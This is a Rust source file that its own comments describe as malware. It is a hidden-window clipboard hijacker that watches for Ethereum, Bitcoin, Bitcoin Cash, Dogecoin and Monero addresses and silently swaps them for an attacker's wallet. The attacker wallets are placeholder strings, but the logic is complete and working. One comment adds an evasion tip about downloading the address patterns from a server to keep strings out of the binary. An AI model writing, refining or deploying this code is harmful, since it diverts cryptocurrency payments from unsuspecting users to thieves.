#![windows_subsystem = "windows"]

use clipboard_master::{CallbackResult, Master};
use copypasta::{ClipboardContext, ClipboardProvider};
use regex::Regex;

/**
 * Ugly macro to shorten the handling of the clipboard.
 * It's use is basically "if stuff fails, return false"
 */
macro_rules! unwrap_or_return {
    ( $e:expr ) => {
        match $e {
            Ok(x) => x,
            Err(_) => return false,
        }
    }
}

/**
 * This is the actual "payload" method of this malware.
 * It matches the currently examined clipboard contents against a regular expression
 * associated with a replacement value. If it matches (and is not the replacement value itself)
 * the clipboard's content will be overwritten with the attacker's wallet's address.
 */
fn check(address:&str, re:&Regex, replacement:&str) -> bool {
    // Get the current regex, compile it (bad form to do this in a loop, actually)
    //let re:Regex = unwrap_or_return!(Regex::new(reg));
    
    // Avoid neverending loops
    let already_done:bool = address.eq_ignore_ascii_case(replacement);
    
    // If regex matches and the current clipboard content is not one of the replacement strings, replace it
    if re.is_match(address) && !already_done {
        unwrap_or_return!(unwrap_or_return!(ClipboardContext::new()).set_contents(replacement.to_owned()));
        return true;
    }

    return already_done;
}

struct Wallet<'a> {
    _name: &'a str,
    regex: Regex,
    replacement: &'a str,
}

fn main() {
    /*
    The following lines define the regular expressions the malware uses to identify wallet addresses.
    They might not be correct.
    In order to be more flexible, this mapping could be hosted on an external server and downloaded when the 
    malware starts. That would also remove the strings from the binary...just saying.
     */
    let wallets = [
        Wallet{ _name: "ETH", regex: Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap(), replacement: "ETH_OVERRIDE_ETH_OVERRIDE_ETH_OVERRIDE", },
        Wallet{ _name: "BTC", regex: Regex::new(r"^(?:(1[a-zA-HJ-NP-Z1-9]{25,59})|(3[a-zA-HJ-NP-Z0-9]{25,59})|(bc1[a-zA-HJ-NP-Z0-9]{25,59}))$").unwrap(), replacement: "BTC_OVERRIDE_BTC_OVERRIDE_BTC_OVERRIDE", },
        Wallet{ _name: "BCH", regex: Regex::new(r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34})|(3[a-km-zA-HJ-NP-Z1-9]{25,34})|(q[a-z0-9]{41})|(p[a-z0-9]{41})$").unwrap(), replacement: "BCH_OVERRIDE_BCH_OVERRIDE_BCH_OVERRIDE", },
        Wallet{ _name: "DOGE", regex: Regex::new(r"^(D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})$").unwrap(), replacement: "DOGE_OVERRIDE_DOGE_OVERRIDE_DOGE_OVERRIDE" },
        Wallet{ _name: "XMR", regex: Regex::new(r"^(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(8[0-9AB][1-9A-HJ-NP-Za-km-z]{93})$").unwrap(), replacement: "XMR_OVERRIDE_XMR_OVERRIDE_XMR_OVERRIDE" },
    ];

    let _ = Master::new(|| { 

        // Get context (open clipboard) or abort
        let mut ctx = match ClipboardContext::new() {
            Ok(c) => c,
            Err(_) => { return CallbackResult::Next; },
        };
    
        // Get current clipboard contents or abort
        let content:String = match ctx.get_contents() {
            Ok(c) => c, Err(_) => return CallbackResult::Next
        };
    
        // Iterate regexes and match. Replace on match (and end loop)
        for wallet in &wallets {
            if check(&content, &wallet.regex, wallet.replacement) {
                return CallbackResult::Next;
            }
        }
    
        CallbackResult::Next 
    
    }, |_| { 
        // Ignore all errors
        CallbackResult::Next
    }).run();
}